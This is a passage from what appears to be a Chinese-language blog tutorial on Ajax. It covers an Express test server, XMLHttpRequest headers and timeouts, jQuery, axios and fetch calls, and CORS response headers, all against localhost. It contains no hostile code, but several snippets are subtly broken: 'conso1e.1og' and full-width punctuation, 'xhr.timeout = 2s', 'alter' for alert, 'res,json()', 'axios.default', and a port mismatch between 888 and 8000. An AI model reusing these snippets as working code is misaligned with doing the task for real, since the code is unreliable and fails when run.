class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">JS</span><br><span class="line"><span class="number">1.</span>安装nodejs</span><br><span class="line"><span class="number">2.</span>npm init --yes</span><br><span class="line"><span class="number">3.</span>npm i express</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在jsw</span></span><br><span class="line"><span class="number">1.</span>引入express</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>创建应用对象</span><br><span class="line"><span class="keyword">const</span> app =  express()</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>创建路由规则</span><br><span class="line"><span class="comment">//request是对请求报文的封装</span></span><br><span class="line"><span class="comment">//response是对响应报文的封装</span></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>,<span class="function">(<span class="params">request,response</span>)=&gt;</span>&#123;</span><br><span class="line"><span class="comment">//设置响应</span></span><br><span class="line">response.send(<span class="string">&quot;hello word!&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;):</span><br><span class="line"></span><br><span class="line"><span class="comment">//4.监听端口启动服务</span></span><br><span class="line">app.listen(<span class="number">8000</span>,（）=&gt;&#123;</span><br><span class="line">conso1e.1og(<span class="string">&quot;服务已经启动，888端口监听中。。.&quot;</span>)；</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//启动服务</span></span><br><span class="line"><span class="comment">//该js文件的上一级目录打开终端，在终端输入node .js</span></span><br></pre></td></tr></table></figure><h1 id="设置请求头"><a href="#设置请求头" class="headerlink" title="设置请求头"></a>设置请求头</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">JS</span><br><span class="line">xhr.open(<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;http://127.0.0.1:8000/server&#x27;</span>);</span><br><span class="line"><span class="comment">//放在open()方法的下面，放在send()方法的上面</span></span><br><span class="line">xhr.setRequestHeader(<span class="string">&#x27;Content-Type&#x27;</span>,<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span><br><span class="line">xhr.send(<span class="string">&#x27;name=ccy&amp;pwd=123456&#x27;</span>);</span><br></pre></td></tr></table></figure><h1 id="服务端响应json数据"><a href="#服务端响应json数据" class="headerlink" title="服务端响应json数据"></a>服务端响应json数据</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">JS</span><br><span class="line"><span class="comment">// 服务器端</span></span><br><span class="line"><span class="comment">// 创建路由规则</span></span><br><span class="line">app.all(<span class="string">&quot;/json-server&quot;</span>,<span class="function">(<span class="params">res,resp</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">// 设置响应头</span></span><br><span class="line">    resp.setHeader(<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>,<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">    <span class="comment">// 设置响应体</span></span><br><span class="line">    <span class="comment">// 格式是json数据</span></span><br><span class="line">    <span class="keyword">let</span> data = &#123;</span><br><span class="line">        name:<span class="string">&quot;ccy&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将json数据格式转换成字符串</span></span><br><span class="line">    <span class="keyword">let</span> str = <span class="built_in">JSON</span>.stringify(data);</span><br><span class="line">    <span class="comment">// send()方法的参数是字符串</span></span><br><span class="line">    resp.send(str);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 前端</span></span><br><span class="line"><span class="comment">// 1.自动把数据转换成json对象返回的数据就是json对象了</span></span><br><span class="line">xhr.responseType = <span class="string">&#x27;json&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.手动转换</span></span><br><span class="line"><span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(xhr.response);<span class="comment">// data得到json对象</span></span><br></pre></td></tr></table></figure><h1 id="nodemon自动重启工具"><a href="#nodemon自动重启工具" class="headerlink" title="nodemon自动重启工具"></a>nodemon自动重启工具</h1><p>每一次修改服务端的代码就不用我们自己保存了，会自动保存</p><p>官网：<a href="https://nodemon.io/">https://nodemon.io/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">JS</span><br><span class="line">&#x2F;&#x2F; 安装nodemon</span><br><span class="line">npm install -g nodemon</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 启动服务</span><br><span class="line">把node ajax.js改成nodemon jax.js</span><br></pre></td></tr></table></figure><p>出现的问题</p><p><img src="image-20220416161600605.png" alt=""></p><p>解决办法：</p><ol><li>管理员身份打开powerShell</li><li>输入set-ExecutionPolicy RemoteSigned</li></ol><p><img src="image-20220416161710300.png" alt=""></p><p><img src="Ajax/image-20220416161726134.png" alt=""></p><h1 id="解决IE缓存的问题"><a href="#解决IE缓存的问题" class="headerlink" title="解决IE缓存的问题"></a>解决IE缓存的问题</h1><p>就是IE访问一次数据，将数据存在本地缓存，第二次去访问<strong>相同路径</strong>时就是去本地缓存找，不会重新去服务器找</p><p>解决办法：</p><p>给IE访问路径加个时间，迫使每一次请求路径都是不一样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">JS</span><br><span class="line">xhr.open(&#39;POST&#39;,&#39;http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;json-server?&#x3D;&#39;+Date.now());</span><br></pre></td></tr></table></figure><h1 id="Ajax请求超时与网络异常"><a href="#Ajax请求超时与网络异常" class="headerlink" title="Ajax请求超时与网络异常"></a>Ajax请求超时与网络异常</h1><h3 id="请求超时"><a href="#请求超时" class="headerlink" title="请求超时"></a>请求超时</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">JS</span><br><span class="line"><span class="comment">// 超时设置 2s</span></span><br><span class="line">xhr.timeout = 2s;</span><br><span class="line"><span class="comment">// 超时回调</span></span><br><span class="line">xhr.ontimeout = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">alter(<span class="string">&quot;请求超时！&quot;</span>);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="请求异常"><a href="#请求异常" class="headerlink" title="请求异常"></a>请求异常</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">JS</span><br><span class="line"><span class="comment">// 请求异常</span></span><br><span class="line">xhr.onerror = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alter(<span class="string">&quot;网络异常，请稍后再尝试！&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="取消请求"><a href="#取消请求" class="headerlink" title="取消请求"></a>取消请求</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">JS</span><br><span class="line">btn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// abort()方法时取消请求</span></span><br><span class="line">    xhr.abort();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="重复请求问题"><a href="#重复请求问题" class="headerlink" title="重复请求问题"></a>重复请求问题</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">HTML</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span>&gt;</span>发送请求<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;demo&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> btn = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;button&#x27;</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> demo = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;demo&#x27;</span>);</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 定义一个标识符</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">let</span> isSend = <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> xhr = <span class="literal">null</span>;</span></span><br><span class="line"><span class="javascript">            btn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="comment">// 第一次发请求，inSend是false，所有不会执行</span></span></span><br><span class="line"><span class="javascript">                <span class="comment">// 第二次发送请求，而第一次请求的readystate的值还没等于4，则isSend等于true,所有会直接取消下一次的请求，等到上一个请求回来响应成功/失败时，才会继续下一次请求</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span>(isSend) xhr.abort();</span></span><br><span class="line"><span class="javascript">                <span class="comment">//1.创建ajax对象</span></span></span><br><span class="line"><span class="javascript">                xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">                <span class="comment">// isSend为true</span></span></span><br><span class="line"><span class="javascript">                isSend = <span class="literal">true</span>;</span></span><br><span class="line"><span class="javascript">                <span class="comment">// xhr.responseType = &#x27;json&#x27;;</span></span></span><br><span class="line"><span class="javascript">                <span class="comment">//2.请求路径</span></span></span><br><span class="line"><span class="javascript">                xhr.open(<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;http://127.0.0.1:8000/json-server&#x27;</span>);</span></span><br><span class="line"><span class="javascript">                xhr.setRequestHeader(<span class="string">&#x27;Content-Type&#x27;</span>,<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span></span><br><span class="line"><span class="javascript">                <span class="comment">//3.发送请求</span></span></span><br><span class="line"><span class="javascript">                xhr.send(<span class="string">&#x27;name=ccy&amp;pwd=123456&#x27;</span>);</span></span><br><span class="line"><span class="javascript">                <span class="comment">//4.监听readystate属性的变化</span></span></span><br><span class="line"><span class="javascript">                xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">if</span>(xhr.readyState === <span class="number">4</span>)&#123;</span></span><br><span class="line"><span class="javascript">                        <span class="comment">// 当第一次发送请求，就把isSend改为false</span></span></span><br><span class="line"><span class="javascript">                        isSend = <span class="literal">false</span></span></span><br><span class="line"><span class="javascript">                        <span class="keyword">if</span>(xhr.status === <span class="number">200</span>)&#123;</span></span><br><span class="line"><span class="javascript">                            <span class="comment">// 5.获取响应的数据</span></span></span><br><span class="line"><span class="javascript">                            <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(xhr.response)</span></span><br><span class="line">                            demo.innerHTML = data</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;           </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="jQuery-Ajax"><a href="#jQuery-Ajax" class="headerlink" title="jQuery Ajax"></a>jQuery Ajax</h1><h3 id="get请求"><a href="#get请求" class="headerlink" title="get请求"></a>get请求</h3><blockquote><p>语法</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">JS</span><br><span class="line">$(selector).get(url,data,success(response,status,xhr),dataType)</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><em>url</em></td><td style="text-align:left">必需。规定将请求发送的哪个 URL。</td></tr><tr><td style="text-align:left"><em>data</em></td><td style="text-align:left">可选。规定连同请求发送到服务器的数据。</td></tr><tr><td style="text-align:left"><em>success(response,status,xhr)</em></td><td style="text-align:left">可选。规定当请求成功时运行的函数。额外的参数：response - 包含来自请求的结果数据 status - 包含请求的状态 xhr - 包含 XMLHttpRequest 对象</td></tr><tr><td style="text-align:left"><em>dataType</em></td><td style="text-align:left">可选。规定预计的服务器响应的数据类型。默认地，jQuery 将智能判断。可能的类型：”xml”—“html”—“text”—“script”—“json”—“jsonp”</td></tr></tbody></table></div><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">JS</span><br><span class="line">$(<span class="string">&#x27;button&#x27;</span>).eq(<span class="number">0</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    第一个参数：url</span></span><br><span class="line"><span class="comment">    第二个参数：传递参数（可选）</span></span><br><span class="line"><span class="comment">    第三个参数：回调函数，会返回响应结果</span></span><br><span class="line"><span class="comment">    第四个参数：设置数据类型，默认不写就是返回字符串类型的数据</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    $.get(<span class="string">&#x27;http://localhost:8000/jqury-server&#x27;</span>,&#123;<span class="attr">a</span>:<span class="number">100</span>,<span class="attr">b</span>:<span class="number">200</span>&#125;,<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(data)</span><br><span class="line">    &#125;,<span class="string">&#x27;json&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="post请求"><a href="#post请求" class="headerlink" title="post请求"></a>post请求</h3><blockquote><p>语法</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">JS</span><br><span class="line">jQuery.post(url,data,success(data, textStatus, jqXHR),dataType)</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><em>url</em></td><td style="text-align:left">必需。规定把请求发送到哪个 URL。</td></tr><tr><td style="text-align:left"><em>data</em></td><td style="text-align:left">可选。映射或字符串值。规定连同请求发送到服务器的数据。</td></tr><tr><td style="text-align:left"><em>success(data, textStatus, jqXHR)</em></td><td style="text-align:left">可选。请求成功时执行的回调函数。</td></tr><tr><td style="text-align:left"><em>dataType</em></td><td style="text-align:left">可选。规定预期的服务器响应的数据类型。默认执行智能判断（xml、json、script 或 html）。</td></tr></tbody></table></div><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">JS</span><br><span class="line">$(<span class="string">&#x27;button&#x27;</span>).eq(<span class="number">1</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    第一个参数：url</span></span><br><span class="line"><span class="comment">    第二个参数：传递参数</span></span><br><span class="line"><span class="comment">    第三个参数：回调函数，会返回响应结果</span></span><br><span class="line"><span class="comment">    第四个参数：设置数据类型，默认不写就是返回字符串类型的数据</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    $.post(<span class="string">&#x27;http://localhost:8000/jqury-server&#x27;</span>,&#123;<span class="attr">a</span>:<span class="number">100</span>,<span class="attr">b</span>:<span class="number">200</span>&#125;,<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(data)</span><br><span class="line">    &#125;,<span class="string">&#x27;json&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="jqury的通用方法发送请求"><a href="#jqury的通用方法发送请求" class="headerlink" title="jqury的通用方法发送请求"></a>jqury的通用方法发送请求</h3><blockquote><p>语法</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">JS</span><br><span class="line">jQuery.ajax([settings])</span><br><span class="line">JS</span><br><span class="line">$(<span class="string">&#x27;button&#x27;</span>).eq(<span class="number">2</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:<span class="string">&quot;http://localhost:8000/jqury-server&quot;</span>,</span><br><span class="line">        data:&#123;<span class="attr">a</span>:<span class="number">100</span>,<span class="attr">b</span>:<span class="number">200</span>&#125;,</span><br><span class="line">        type:<span class="string">&quot;GET&quot;</span>,</span><br><span class="line">        dataType:<span class="string">&quot;json&quot;</span>,</span><br><span class="line">        success:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(data)</span><br><span class="line">    &#125;,</span><br><span class="line">        timeout:<span class="number">2000</span>,</span><br><span class="line">        error:<span class="function"><span class="keyword">function</span>(<span class="params">err</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(err)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">// 自定义请求头，需要再服务端设置 resp.setHeader(&#x27;Access-Control-Allow-Headers&#x27;,&#x27;*&#x27;)</span></span><br><span class="line">    headers:&#123;</span><br><span class="line">        a:<span class="number">300</span>,</span><br><span class="line">            b:<span class="number">200</span></span><br><span class="line">    &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="axios请求"><a href="#axios请求" class="headerlink" title="axios请求"></a>axios请求</h1><h3 id="get请求-1"><a href="#get请求-1" class="headerlink" title="get请求"></a>get请求</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">JS</span><br><span class="line"><span class="comment">// 需引入jquery和axios</span></span><br><span class="line">axios.get(<span class="string">&quot;http://localhost:8000/axios-server&quot;</span>,&#123;</span><br><span class="line">    params:&#123;</span><br><span class="line">        name:<span class="string">&quot;ccy&quot;</span>,</span><br><span class="line">        id:<span class="number">100</span></span><br><span class="line">    &#125;,</span><br><span class="line">    headers:&#123;</span><br><span class="line">        name:<span class="string">&quot;ccy&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="post请求-1"><a href="#post请求-1" class="headerlink" title="post请求"></a>post请求</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">JS</span><br><span class="line"><span class="comment">// 需引入jquery和axios</span></span><br><span class="line">axios.default.baseURL = <span class="string">&quot;http://localhost:8000&quot;</span></span><br><span class="line">axios.post(<span class="string">&quot;/axios-server&quot;</span>,&#123;<span class="attr">username</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="attr">pwd</span>:<span class="string">&#x27;123456&#x27;</span>&#125;,&#123;</span><br><span class="line">    params:&#123;</span><br><span class="line">        name:<span class="string">&quot;ccy&quot;</span>,</span><br><span class="line">        id:<span class="number">100</span></span><br><span class="line">    &#125;,</span><br><span class="line">    headers:&#123;</span><br><span class="line">        name:<span class="string">&quot;ccy&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="axios请求-1"><a href="#axios请求-1" class="headerlink" title="axios请求"></a>axios请求</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">JS</span><br><span class="line"><span class="comment">// 需引入jquery和axios</span></span><br><span class="line">axios(&#123;</span><br><span class="line">    method:<span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    url:<span class="string">&#x27;http://localhost:8000/axios-server&#x27;</span>,</span><br><span class="line">    params:&#123;</span><br><span class="line">        a:<span class="number">100</span>,</span><br><span class="line">        b:<span class="number">200</span></span><br><span class="line">    &#125;,</span><br><span class="line">    headers:&#123;</span><br><span class="line">        a:<span class="number">100</span>,</span><br><span class="line">        b:<span class="number">200</span></span><br><span class="line">    &#125;,</span><br><span class="line">    data:&#123;</span><br><span class="line">        username:<span class="string">&quot;admin&quot;</span>,</span><br><span class="line">        pwd:<span class="string">&quot;123456&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="fetch请求"><a href="#fetch请求" class="headerlink" title="fetch请求"></a>fetch请求</h1><p>fetch是全局的，在哪里都可以使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">JS</span><br><span class="line">fetch(<span class="string">&quot;http://localhost:8000/fetch-server&quot;</span>,&#123;</span><br><span class="line">    method:<span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    headers:&#123;</span><br><span class="line">        a:<span class="number">100</span>,</span><br><span class="line">        b:<span class="number">200</span></span><br><span class="line">    &#125;,</span><br><span class="line">    body:<span class="string">&quot;username=admin&amp;pwd=123456&quot;</span></span><br><span class="line">&#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//return res.text();</span></span><br><span class="line">    <span class="keyword">return</span> res,json();</span><br><span class="line">&#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="跨域问题"><a href="#跨域问题" class="headerlink" title="跨域问题"></a>跨域问题</h1><p>同源策略：最早由Netscape公司提出，是浏览器的一种安全策略。</p><p>同源：协议，域名，端口号，必须完全相同。</p><p>违背同源策略就是跨域。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">JS</span><br><span class="line"><span class="comment">// 服务端解决跨域问题</span></span><br><span class="line">resp.setHeader(<span class="string">&quot;Access-Control-Allow-Origin&quot;</span>,<span class="string">&quot;*&quot;</span>);<span class="comment">// 允许哪些协议可以向这个服务端发送请求</span></span><br><span class="line">resp.setHeader(<span class="string">&quot;Access-Control-Allow-Headers&quot;</span>,<span class="string">&quot;*&quot;</span>);<span class="comment">// </span></span><br><span class="line">resp.setHeader(<span class="string">&quot;Access-Control-Allow-Method&quot;</span>,<span class="string">&quot;*&quot;</span>);<span class="comment">// 允许哪些方法可以向这个服务端发送请求</span></span><br><span class="line">HTML</span><br><span class="line">&lt;!-- 前端解决跨域问题 --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    $(<span class="string">&#x27;button&#x27;</span>).eq(<span class="number">0</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// callback参数一定是必写的，值是一个?</span></span><br><span class="line">        